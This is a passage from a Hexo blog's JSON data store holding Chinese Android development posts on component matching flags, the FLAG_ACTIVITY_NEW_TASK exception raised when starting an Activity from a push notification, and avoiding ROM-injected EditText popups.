<span class=\"comment\">// 重点关注</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> ((flags &amp; MATCH_SYSTEM_ONLY) != <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!isSystemApp) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">final</span> <span class=\"type\">boolean</span> <span class=\"variable\">matchesUnaware</span> <span class=\"operator\">=</span> ((flags &amp; MATCH_DIRECT_BOOT_UNAWARE) != <span class=\"number\">0</span>)</span><br><span class=\"line\">            &amp;&amp; !componentInfo.directBootAware;</span><br><span class=\"line\">    <span class=\"keyword\">final</span> <span class=\"type\">boolean</span> <span class=\"variable\">matchesAware</span> <span class=\"operator\">=</span> ((flags &amp; MATCH_DIRECT_BOOT_AWARE) != <span class=\"number\">0</span>)</span><br><span class=\"line\">            &amp;&amp; componentInfo.directBootAware;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> matchesUnaware || matchesAware; <span class=\"comment\">// 重点关注</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>哟，瞧瞧，这限制真的不少啊。对于三方非系统应用来说，我们暂时只用关心两个return分支。</p>\n<h3 id=\"解决\"><a href=\"#解决\" class=\"headerlink\" title=\"解决\"></a>解决</h3><p>从上述的isMatch源码来分析问题排查办法。</p>\n<p>第一个即isEnabled的检查，这个我们可以对应Service组件中的 <code>android:enabled</code> 属性，也就是说当你的组件被禁用时，那么对应Service的ServiceInfo就不会返回给外部了，这个很好理解，组件不可用时，外部肯定不能获取其信息，所以你要去bindService之类的操作肯定是抛异常的。当然，此属性默认值是true，但我们不排除业务逻辑中有动态设置false的可能，这个具体参考PackageManager的<strong>setComponentEnabledSetting</strong>方法，此处不赘述。</p>\n<p>第二个即组件<strong>direct-boot</strong>（直接启动模式）的相关设置，这是从7.1之后出现的特性，对应 <code>android:directBootAware</code> 属性，该属性默认是false，即不支持该模式，那么很可能你的应用在设备加密锁屏后获取不到所需要的Service组件。可将<strong>directBootAware</strong>属性设为<strong>true</strong>后再尝试是否能解决本文问题，若涉及到Context的，还需要额外操作，具体参考谷歌官方文档中对直接启动模式的详细介绍和适配方式：<a href=\"https://developer.android.com/training/articles/direct-boot.html\">https://developer.android.com/training/articles/direct-boot.html</a>。</p>\n"},{"layout":"post","title":"为何点击推送通知打不开Activity？Calling startActivity() from outside……","subtitle":"知其所以然。","date":"2019-11-18T16:00:00.000Z","author":"YSY","header-img":"img/home-bg.jpg","catalog":true,"_content":"\n小米推送Android SDK有这么一个耳熟能详的方法：\n```java\n/**\n * 接收服务器向客户端发送的通知消息，在用户手动点击通知后触发\n */\npublic void onNotificationMessageClicked(Context context, MiPushMessage message) {\n\t...\n\tcontext.startActivity(intent);\n}\n```\n如果在其中手动增加启动Activity的逻辑，会发现，点了没反应。把 `startActivity` 方法try-catch后，发现这么一个异常：\n\n> Calling startActivity() from outside of an Activity context requires the \n> FLAG_ACTIVITY_NEW_TASK flag. Is this really what you want?\n\n解读一下就是，说我要是从外面启动本应用的Activity需要传 `FLAG_ACTIVITY_NEW_TASK` 标识，还特别嘲讽地反问我一句：Is this really what you want? 这真是你想要的？\n![img1](https://imgconvert.csdnimg.cn/20190702011449586.png)\n我不想要我调你方法干嘛。\n## 解决\n解决就不说了，报错提示摆明了，要我传NEW_TASK，是的，就这么简单。\n```java\npublic void onNotificationMessageClicked(Context context, MiPushMessage message) {\n\t...\n\tintent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);\n\tcontext.startActivity(intent);\n}\n```\n## 为什么\n这异常到底是什么意思？找找系统源码（基于Android P源码）：\n`frameworks/base/core/java/android/app/ContextImpl.java` 在此类中，大概900多行的位置：\n```java\n...\n    @Override\n    public void startActivity(Intent intent, Bundle options) {\n        warnIfCallingFromSystemProcess();\n\n        // Calling start activity from outside an activity without FLAG_ACTIVITY_NEW_TASK is\n        // generally not allowed, except if the caller specifies the task id the activity should\n        // be launched in. A bug was existed between N and O-MR1 which allowed this to work. We\n        // maintain this for backwards compatibility.\n        final int targetSdkVersion = getApplicationInfo().targetSdkVersion;\n\n        if ((intent.getFlags() & Intent.FLAG_ACTIVITY_NEW_TASK) == 0\n                && (targetSdkVersion < Build.VERSION_CODES.N\n                        || targetSdkVersion >= Build.VERSION_CODES.P)\n                && (options == null\n                        || ActivityOptions.fromBundle(options).getLaunchTaskId() == -1)) {\n            throw new AndroidRuntimeException(\n                    \"Calling startActivity() from outside of an Activity \"\n                            + \" context requires the FLAG_ACTIVITY_NEW_TASK flag.\"\n                            + \" Is this really what you want?\");\n        }\n        mMainThread.getInstrumentation().execStartActivity(\n                getOuterContext(), mMainThread.getApplicationThread(), null,\n                (Activity) null, intent, -1, options);\n    }\n...\n```\n从这段长注释可以看出：\n\n1. 并不是一定要带NEW_TASK，如果指定了任务栈，也没问题，这一点从判断逻辑中的 `ActivityOptions.fromBundle(options).getLaunchTaskId() == -1` 即可看出；\n2. 竟然这个异常在Android N到O上不会抛出，且谷歌指明这是一个Bug，只是为了兼容，保留了这个判断：`targetSdkVersion < Build.VERSION_CODES.N || targetSdkVersion >= Build.VERSION_CODES.P` ，因此对于targetSDK小于N或大于等于P的应用，就会正常地抛出此异常。\n\n回到最开始的推送click回调中，其中传入的**context**本身不属于**Activity**，而是**ApplicationContext**（可以用instanceof来验证），不能启动另一个Activity，因为系统也不知道它应该属于哪个任务栈，所以需要你指定，不管是通过NEW_TASK的方式还是设置Activity的 `android:taskAffinity` 属性。\n\n再看，小米推送发通知的操作是系统推送服务框架执行的，服务框架表面上本身不具有Activity组件，也没有任务栈，所以不指定task的话就无法启动另一个Activity。\n\n那为什么在targetSDK在N到O之间就可以呢？谷歌说的Bug现象是什么呢？可以推理，不指定任务栈还要强制启动一个Activity，那么该“游离”Activity虽然可以启动，但在最近任务列表里看不见；或者说系统为其指定了默认的task，当再从桌面正常启动应用时，最近任务就会出现两个MainActivity这种类似现象。\n","source":"_posts/2019-11-19-为何点击推送通知打不开Activity？Calling startActivity() from outside…….md","raw":"---\nlayout:     post\ntitle:      为何点击推送通知打不开Activity？Calling startActivity() from outside……\nsubtitle:   知其所以然。\ndate:       2019-11-19\nauthor:     YSY\nheader-img: img/home-bg.jpg\ncatalog: true\ntags:\n    - Android\n    - AOSP\n---\n\n小米推送Android SDK有这么一个耳熟能详的方法：\n```java\n/**\n * 接收服务器向客户端发送的通知消息，在用户手动点击通知后触发\n */\npublic void onNotificationMessageClicked(Context context, MiPushMessage message) {\n\t...\n\tcontext.startActivity(intent);\n}\n```\n如果在其中手动增加启动Activity的逻辑，会发现，点了没反应。把 `startActivity` 方法try-catch后，发现这么一个异常：\n\n> Calling startActivity() from outside of an Activity context requires the \n> FLAG_ACTIVITY_NEW_TASK flag. Is this really what you want?\n\n解读一下就是，说我要是从外面启动本应用的Activity需要传 `FLAG_ACTIVITY_NEW_TASK` 标识，还特别嘲讽地反问我一句：Is this really what you want? 这真是你想要的？\n![img1](https://imgconvert.csdnimg.cn/20190702011449586.png)\n我不想要我调你方法干嘛。\n## 解决\n解决就不说了，报错提示摆明了，要我传NEW_TASK，是的，就这么简单。\n```java\npublic void onNotificationMessageClicked(Context context, MiPushMessage message) {\n\t...\n\tintent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);\n\tcontext.startActivity(intent);\n}\n```\n## 为什么\n这异常到底是什么意思？找找系统源码（基于Android P源码）：\n`frameworks/base/core/java/android/app/ContextImpl.java` 在此类中，大概900多行的位置：\n```java\n...\n    @Override\n    public void startActivity(Intent intent, Bundle options) {\n        warnIfCallingFromSystemProcess();\n\n        // Calling start activity from outside an activity without FLAG_ACTIVITY_NEW_TASK is\n        // generally not allowed, except if the caller specifies the task id the activity should\n        // be launched in. A bug was existed between N and O-MR1 which allowed this to work. We\n        // maintain this for backwards compatibility.\n        final int targetSdkVersion = getApplicationInfo().targetSdkVersion;\n\n        if ((intent.getFlags() & Intent.FLAG_ACTIVITY_NEW_TASK) == 0\n                && (targetSdkVersion < Build.VERSION_CODES.N\n                        || targetSdkVersion >= Build.VERSION_CODES.P)\n                && (options == null\n                        || ActivityOptions.fromBundle(options).getLaunchTaskId() == -1)) {\n            throw new AndroidRuntimeException(\n                    \"Calling startActivity() from outside of an Activity \"\n                            + \" context requires the FLAG_ACTIVITY_NEW_TASK flag.\"\n                            + \" Is this really what you want?\");\n        }\n        mMainThread.getInstrumentation().execStartActivity(\n                getOuterContext(), mMainThread.getApplicationThread(), null,\n                (Activity) null, intent, -1, options);\n    }\n...\n```\n从这段长注释可以看出：\n\n1. 并不是一定要带NEW_TASK，如果指定了任务栈，也没问题，这一点从判断逻辑中的 `ActivityOptions.fromBundle(options).getLaunchTaskId() == -1` 即可看出；\n2. 竟然这个异常在Android N到O上不会抛出，且谷歌指明这是一个Bug，只是为了兼容，保留了这个判断：`targetSdkVersion < Build.VERSION_CODES.N || targetSdkVersion >= Build.VERSION_CODES.P` ，因此对于targetSDK小于N或大于等于P的应用，就会正常地抛出此异常。\n\n回到最开始的推送click回调中，其中传入的**context**本身不属于**Activity**，而是**ApplicationContext**（可以用instanceof来验证），不能启动另一个Activity，因为系统也不知道它应该属于哪个任务栈，所以需要你指定，不管是通过NEW_TASK的方式还是设置Activity的 `android:taskAffinity` 属性。\n\n再看，小米推送发通知的操作是系统推送服务框架执行的，服务框架表面上本身不具有Activity组件，也没有任务栈，所以不指定task的话就无法启动另一个Activity。\n\n那为什么在targetSDK在N到O之间就可以呢？谷歌说的Bug现象是什么呢？可以推理，不指定任务栈还要强制启动一个Activity，那么该“游离”Activity虽然可以启动，但在最近任务列表里看不见；或者说系统为其指定了默认的task，当再从桌面正常启动应用时，最近任务就会出现两个MainActivity这种类似现象。\n","slug":"为何点击推送通知打不开Activity？Calling startActivity() from outside……","published":1,"updated":"2024-03-25T07:31:25.857Z","comments":1,"photos":[],"link":"","_id":"cluaufh0s001pthe6ctx99hup","content":"<p>小米推送Android SDK有这么一个耳熟能详的方法：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 接收服务器向客户端发送的通知消息，在用户手动点击通知后触发</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">onNotificationMessageClicked</span><span class=\"params\">(Context context, MiPushMessage message)</span> &#123;</span><br><span class=\"line\">\t...</span><br><span class=\"line\">\tcontext.startActivity(intent);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>如果在其中手动增加启动Activity的逻辑，会发现，点了没反应。把 <code>startActivity</code> 方法try-catch后，发现这么一个异常：</p>\n<blockquote>\n<p>Calling startActivity() from outside of an Activity context requires the<br>FLAG_ACTIVITY_NEW_TASK flag. Is this really what you want?</p>\n</blockquote>\n<p>解读一下就是，说我要是从外面启动本应用的Activity需要传 <code>FLAG_ACTIVITY_NEW_TASK</code> 标识，还特别嘲讽地反问我一句：Is this really what you want? 这真是你想要的？<br><img src=\"https://imgconvert.csdnimg.cn/20190702011449586.png\" alt=\"img1\"><br>我不想要我调你方法干嘛。</p>\n<h2 id=\"解决\"><a href=\"#解决\" class=\"headerlink\" title=\"解决\"></a>解决</h2><p>解决就不说了，报错提示摆明了，要我传NEW_TASK，是的，就这么简单。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">onNotificationMessageClicked</span><span class=\"params\">(Context context, MiPushMessage message)</span> &#123;</span><br><span class=\"line\">\t...</span><br><span class=\"line\">\tintent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);</span><br><span class=\"line\">\tcontext.startActivity(intent);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"为什么\"><a href=\"#为什么\" class=\"headerlink\" title=\"为什么\"></a>为什么</h2><p>这异常到底是什么意思？找找系统源码（基于Android P源码）：<br><code>frameworks/base/core/java/android/app/ContextImpl.java</code> 在此类中，大概900多行的位置：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">...</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">startActivity</span><span class=\"params\">(Intent intent, Bundle options)</span> &#123;</span><br><span class=\"line\">        warnIfCallingFromSystemProcess();</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// Calling start activity from outside an activity without FLAG_ACTIVITY_NEW_TASK is</span></span><br><span class=\"line\">        <span class=\"comment\">// generally not allowed, except if the caller specifies the task id the activity should</span></span><br><span class=\"line\">        <span class=\"comment\">// be launched in. A bug was existed between N and O-MR1 which allowed this to work. We</span></span><br><span class=\"line\">        <span class=\"comment\">// maintain this for backwards compatibility.</span></span><br><span class=\"line\">        <span class=\"keyword\">final</span> <span class=\"type\">int</span> <span class=\"variable\">targetSdkVersion</span> <span class=\"operator\">=</span> getApplicationInfo().targetSdkVersion;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> ((intent.getFlags() &amp; Intent.FLAG_ACTIVITY_NEW_TASK) == <span class=\"number\">0</span></span><br><span class=\"line\">                &amp;&amp; (targetSdkVersion &lt; Build.VERSION_CODES.N</span><br><span class=\"line\">                        || targetSdkVersion &gt;= Build.VERSION_CODES.P)</span><br><span class=\"line\">                &amp;&amp; (options == <span class=\"literal\">null</span></span><br><span class=\"line\">                        || ActivityOptions.fromBundle(options).getLaunchTaskId() == -<span class=\"number\">1</span>)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">AndroidRuntimeException</span>(</span><br><span class=\"line\">                    <span class=\"string\">&quot;Calling startActivity() from outside of an Activity &quot;</span></span><br><span class=\"line\">                            + <span class=\"string\">&quot; context requires the FLAG_ACTIVITY_NEW_TASK flag.&quot;</span></span><br><span class=\"line\">                            + <span class=\"string\">&quot; Is this really what you want?&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        mMainThread.getInstrumentation().execStartActivity(</span><br><span class=\"line\">                getOuterContext(), mMainThread.getApplicationThread(), <span class=\"literal\">null</span>,</span><br><span class=\"line\">                (Activity) <span class=\"literal\">null</span>, intent, -<span class=\"number\">1</span>, options);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n<p>从这段长注释可以看出：</p>\n<ol>\n<li>并不是一定要带NEW_TASK，如果指定了任务栈，也没问题，这一点从判断逻辑中的 <code>ActivityOptions.fromBundle(options).getLaunchTaskId() == -1</code> 即可看出；</li>\n<li>竟然这个异常在Android N到O上不会抛出，且谷歌指明这是一个Bug，只是为了兼容，保留了这个判断：<code>targetSdkVersion &lt; Build.VERSION_CODES.N || targetSdkVersion &gt;= Build.VERSION_CODES.P</code> ，因此对于targetSDK小于N或大于等于P的应用，就会正常地抛出此异常。</li>\n</ol>\n<p>回到最开始的推送click回调中，其中传入的<strong>context</strong>本身不属于<strong>Activity</strong>，而是<strong>ApplicationContext</strong>（可以用instanceof来验证），不能启动另一个Activity，因为系统也不知道它应该属于哪个任务栈，所以需要你指定，不管是通过NEW_TASK的方式还是设置Activity的 <code>android:taskAffinity</code> 属性。</p>\n<p>再看，小米推送发通知的操作是系统推送服务框架执行的，服务框架表面上本身不具有Activity组件，也没有任务栈，所以不指定task的话就无法启动另一个Activity。</p>\n<p>那为什么在targetSDK在N到O之间就可以呢？谷歌说的Bug现象是什么呢？可以推理，不指定任务栈还要强制启动一个Activity，那么该“游离”Activity虽然可以启动，但在最近任务列表里看不见；或者说系统为其指定了默认的task，当再从桌面正常启动应用时，最近任务就会出现两个MainActivity这种类似现象。</p>\n","site":{"data":{"widget":{"top":[{"class_name":"donate","id_name":"donate","name":"随缘支持","icon":"fas fa-heartbeat","html":"<p style=\"text-align:center;padding:0;margin:0;\"><a href=\"https://qr.alipay.com/fkx12362diu95oh2aweaac5\"><img src=\"https://blog.ysy950803.top/img/love-support.png\" width=\"200\" height=\"200\"/></a></p> <p style=\"text-align:center;padding:0;margin:0;\">移动端点击二维码亦可</p> <p style=\"text-align:center;padding:0;margin:0;\"><u><a href=\"https://paypal.me/yaoshengyu\">Paypal.me if you like</a></u></p>"}]}}},"cover":false,"excerpt":"","more":"<p>小米推送Android SDK有这么一个耳熟能详的方法：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 接收服务器向客户端发送的通知消息，在用户手动点击通知后触发</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">onNotificationMessageClicked</span><span class=\"params\">(Context context, MiPushMessage message)</span> &#123;</span><br><span class=\"line\">\t...</span><br><span class=\"line\">\tcontext.startActivity(intent);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>如果在其中手动增加启动Activity的逻辑，会发现，点了没反应。把 <code>startActivity</code> 方法try-catch后，发现这么一个异常：</p>\n<blockquote>\n<p>Calling startActivity() from outside of an Activity context requires the<br>FLAG_ACTIVITY_NEW_TASK flag. Is this really what you want?</p>\n</blockquote>\n<p>解读一下就是，说我要是从外面启动本应用的Activity需要传 <code>FLAG_ACTIVITY_NEW_TASK</code> 标识，还特别嘲讽地反问我一句：Is this really what you want? 这真是你想要的？<br><img src=\"https://imgconvert.csdnimg.cn/20190702011449586.png\" alt=\"img1\"><br>我不想要我调你方法干嘛。</p>\n<h2 id=\"解决\"><a href=\"#解决\" class=\"headerlink\" title=\"解决\"></a>解决</h2><p>解决就不说了，报错提示摆明了，要我传NEW_TASK，是的，就这么简单。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">onNotificationMessageClicked</span><span class=\"params\">(Context context, MiPushMessage message)</span> &#123;</span><br><span class=\"line\">\t...</span><br><span class=\"line\">\tintent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);</span><br><span class=\"line\">\tcontext.startActivity(intent);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"为什么\"><a href=\"#为什么\" class=\"headerlink\" title=\"为什么\"></a>为什么</h2><p>这异常到底是什么意思？找找系统源码（基于Android P源码）：<br><code>frameworks/base/core/java/android/app/ContextImpl.java</code> 在此类中，大概900多行的位置：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">...</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">startActivity</span><span class=\"params\">(Intent intent, Bundle options)</span> &#123;</span><br><span class=\"line\">        warnIfCallingFromSystemProcess();</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// Calling start activity from outside an activity without FLAG_ACTIVITY_NEW_TASK is</span></span><br><span class=\"line\">        <span class=\"comment\">// generally not allowed, except if the caller specifies the task id the activity should</span></span><br><span class=\"line\">        <span class=\"comment\">// be launched in. A bug was existed between N and O-MR1 which allowed this to work. We</span></span><br><span class=\"line\">        <span class=\"comment\">// maintain this for backwards compatibility.</span></span><br><span class=\"line\">        <span class=\"keyword\">final</span> <span class=\"type\">int</span> <span class=\"variable\">targetSdkVersion</span> <span class=\"operator\">=</span> getApplicationInfo().targetSdkVersion;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> ((intent.getFlags() &amp; Intent.FLAG_ACTIVITY_NEW_TASK) == <span class=\"number\">0</span></span><br><span class=\"line\">                &amp;&amp; (targetSdkVersion &lt; Build.VERSION_CODES.N</span><br><span class=\"line\">                        || targetSdkVersion &gt;= Build.VERSION_CODES.P)</span><br><span class=\"line\">                &amp;&amp; (options == <span class=\"literal\">null</span></span><br><span class=\"line\">                        || ActivityOptions.fromBundle(options).getLaunchTaskId() == -<span class=\"number\">1</span>)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">AndroidRuntimeException</span>(</span><br><span class=\"line\">                    <span class=\"string\">&quot;Calling startActivity() from outside of an Activity &quot;</span></span><br><span class=\"line\">                            + <span class=\"string\">&quot; context requires the FLAG_ACTIVITY_NEW_TASK flag.&quot;</span></span><br><span class=\"line\">                            + <span class=\"string\">&quot; Is this really what you want?&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        mMainThread.getInstrumentation().execStartActivity(</span><br><span class=\"line\">                getOuterContext(), mMainThread.getApplicationThread(), <span class=\"literal\">null</span>,</span><br><span class=\"line\">                (Activity) <span class=\"literal\">null</span>, intent, -<span class=\"number\">1</span>, options);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n<p>从这段长注释可以看出：</p>\n<ol>\n<li>并不是一定要带NEW_TASK，如果指定了任务栈，也没问题，这一点从判断逻辑中的 <code>ActivityOptions.fromBundle(options).getLaunchTaskId() == -1</code> 即可看出；</li>\n<li>竟然这个异常在Android N到O上不会抛出，且谷歌指明这是一个Bug，只是为了兼容，保留了这个判断：<code>targetSdkVersion &lt; Build.VERSION_CODES.N || targetSdkVersion &gt;= Build.VERSION_CODES.P</code> ，因此对于targetSDK小于N或大于等于P的应用，就会正常地抛出此异常。</li>\n</ol>\n<p>回到最开始的推送click回调中，其中传入的<strong>context</strong>本身不属于<strong>Activity</strong>，而是<strong>ApplicationContext</strong>（可以用instanceof来验证），不能启动另一个Activity，因为系统也不知道它应该属于哪个任务栈，所以需要你指定，不管是通过NEW_TASK的方式还是设置Activity的 <code>android:taskAffinity</code> 属性。</p>\n<p>再看，小米推送发通知的操作是系统推送服务框架执行的，服务框架表面上本身不具有Activity组件，也没有任务栈，所以不指定task的话就无法启动另一个Activity。</p>\n<p>那为什么在targetSDK在N到O之间就可以呢？谷歌说的Bug现象是什么呢？可以推理，不指定任务栈还要强制启动一个Activity，那么该“游离”Activity虽然可以启动，但在最近任务列表里看不见；或者说系统为其指定了默认的task，当再从桌面正常启动应用时，最近任务就会出现两个MainActivity这种类似现象。</p>\n"},{"layout":"post","title":"避免Android定制ROM中的EditText出现pop弹窗","subtitle":"知其所以然。","date":"2019-12-06T16:00:00.000Z","author":"YSY","header-img":"img/home-bg.jpg","catalog":true,"_content":"\n### 问题\n可能看到标题的同学一头雾水，这是什么东西，其实类似于你长按文本时出现的复制粘贴pop弹窗。在一些定制ROM中，厂商为了某些方便用户的特殊功能会增加文本输入检测和自定义弹窗，举例：\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20191207163617238.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70)\n比如在你输入一些邮箱时，会自动弹出这种pop（并不需要你长按），且这个并非系统应用才有的，而是直接影响了所有EditText。\n对于一些高度定制化UI的应用来说，这个可能影响用户体验。下面给出两种解决办法（都不算特别完美，毕竟卑微的应用层开发者改不了底层实现），大家酌情参考。\n### 解决\n**方法一：**\n要解决问题先思考（合理猜测）一下它的实现原理，很显然它修改了EditText或者TextView源码，在文本输入监听中加入了对邮箱特征的检测，我们可以尝试修改getText方法的返回值，过滤这种特征：\n```java\n\t// 在自定义的EditText中重写getText\n\t@Override\n\tpublic Editable getText() {\n\t    String text = super.getText() != null ? super.getText().toString() : null;\n\t    if (text != null && text.contains(\"@\")) {\n\t    \t// 如果输入内容包含@符号，则删掉再返回\n\t        return Editable.Factory.getInstance().newEditable(text.replaceAll(\"@\", \"\"));\n\t    }\n\t    return super.getText();\n\t}\n```\n当然有同学会说，上述办法也影响了getText方法返回内容的正确性，没关系，我们反正是自定义控件，再补一个方法即可，业务代码外部调用就调这个：\n```java\n\tpublic Editable getRealText() {\n\t    return super.getText();\n\t}\n```\n**方法二：**\n这个方法适合不需要自定义EditText游标的同学，非常简单，给EditText的xml代码加上 `android:textCursorDrawable=\"@null\"` 属性即可。\n有人会觉得奇怪，这个cursor的drawable跟pop弹窗有啥关系，因为原生的复制粘贴pop弹窗在显示之前要计算游标（Cursor）的位置，且会检查 `mDrawableForCursor` 是否存在，如果不存在就不走后续逻辑了，具体可以参看Editor源码：\n```java\n    void updateCursorPosition() {\n        loadCursorDrawable();\n        if (mDrawableForCursor == null) {\n            return;\n        }\n        // ...\n    }\n```\n那么上述“常用邮箱”之类的弹窗其实也类似。\n","source":"_posts/2019-12-07-避免Android定制ROM中的EditText出现pop弹窗.md","raw":"---\nlayout:     post\ntitle:      避免Android定制ROM中的EditText出现pop弹窗\nsubtitle:   知其所以然。\ndate:       2019-12-07\nauthor:     YSY\nheader-img: img/home-bg.jpg\ncatalog: true\ntags:\n    - Android\n---\n\n### 问题\n可能看到标题的同学一头雾水，这是什么东西，其实类似于你长按文本时出现的复制粘贴pop弹窗。在一些定制ROM中，厂商为了某些方便用户的特殊功能会增加文本输入检测和自定义弹窗，举例：\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20191207163617238.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70)\n比如在你输入一些邮箱时，会自动弹出这种pop（并不需要你长按），且这个并非系统应用才有的，而是直接影响了所有EditText。\n对于一些高度定制化UI的应用来说，这个可能影响用户体验。下面给出两种解决办法（都不算特别完美，毕竟卑微的应用层开发者改不了底层实现），大家酌情参考。\n### 解决\n**方法一：**\n要解决问题先思考（合理猜测）一下它的实现原理，很显然它修改了EditText或者TextView源码，在文本输入监听中加入了对邮箱特征的检测，我们可以尝试修改getText方法的返回值，过滤这种特征：\n```java\n\t// 在自定义的EditText中重写getText\n\t@Override\n\tpublic Editable getText() {\n\t    String text = super.getText() != null ? super.getText().toString() : null;\n\t    if (text != null && text.contains(\"@\")) {\n\t    \t// 如果输入内容包含@符号，则删掉再返回\n\t        return Editable.Factory.getInstance().newEditable(text.replaceAll(\"@\", \"\"));\n\t    }\n\t    return super.getText();\n\t}\n```\n当然有同学会说，上述办法也影响了getText方法返回内容的正确性，没关系，我们反正是自定义控件，再补一个方法即可，业务代码外部调用就调这个：\n```java\n\tpublic Editable getRealText() {\n\t    return super.getText();\n\t}\n```\n**方法二：**\n这个方法适合不需要自定义EditText游标的同学，非常简单，给EditText的xml代码加上 `android:textCursorDrawable=\"@null\"` 属性即可。\n有人会觉得奇怪，这个cursor的drawable跟pop弹窗有啥关系，因为原生的复制粘贴pop弹窗在显示之前要计算游标（Cursor）的位置，且会检查 `mDrawableForCursor` 是否存在，如果不存在就不走后续逻辑了，具体可以参看Editor源码：\n```java\n    void 